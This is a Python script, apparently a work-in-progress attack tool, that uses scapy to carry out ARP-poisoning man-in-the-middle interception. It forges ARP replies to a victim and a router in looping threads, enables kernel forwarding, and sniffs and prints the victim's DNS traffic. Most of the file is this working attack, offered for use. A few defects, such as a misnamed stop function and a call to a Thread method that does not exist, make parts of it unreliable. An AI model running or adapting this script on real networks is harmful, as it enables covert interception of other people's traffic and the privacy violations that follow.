from scapy.all import *
from Forward import *
import threading

def forge_arp_response(rcv_ip, rcv_mac, res_ip, res_mac):
	return Ether(dst=rcv_mac) / ARP(
		op=2,
		psrc=res_ip,
		pdst=rcv_ip,
		hwsrc=res_mac,
		hwdst=rcv_mac
	)
	
def poison_loop(pkt, interface, interval):
	sendp(pkt, iface=interface, loop=1, inter=interval)
	
def start_arp_mitm(src_ip, src_mac, dst_ip, dst_mac, self_mac, interface):
	poison_src = forge_arp_response(src_ip, src_mac, dst_ip, self_mac)
	poison_dst = forge_arp_response(dst_ip, dst_mac, src_ip, self_mac)
    
	src_thread = threading.Thread(target=poison_loop, args=(poison_src, interface, 20), daemon=True)
	dst_thread = threading.Thread(target=poison_loop, args=(poison_dst, interface, 20), daemon=True) # todo add ways to customise intervals / interfaces
	
	src_thread.start()
	dst_thread.start()
	
	return [src_thread, dst_thread]

    # todo find good timings for sending poison/stealth mode(?) (base on OS?)

    
def stop_arp_mittm(threads):
	threads[0].stop()
	threads[1].stop()
	
def only_dns(pkt):
    	if pkt.haslayer(UDP):
        	if pkt.haslayer(DNS):
            		print(pkt.summary())

	
# placeholder
victim_ip = "192.168.1.101"
victim_mac = "00:0c:29:5c:dd:75"
router_ip = "192.168.1.1"
router_mac = "00:0c:29:9a:aa:86"
self_ip = "192.168.1.100"
self_mac = "00:0c:29:c0:d0:fc"

enable_kernel_forwarding("eth0")

threads = start_arp_mitm(victim_ip, victim_mac, router_ip, router_mac , self_mac, "eth0")

def print_fn(pkt):
	print(pkt[Ether].src)
	print(pkt.summary())
	
intercept_pkts(victim_ip, self_mac, "eth0", only_dns, print_fn)

input("\nstop")

stop_arp_mitm(threads)
cleanup_forward("eth0")
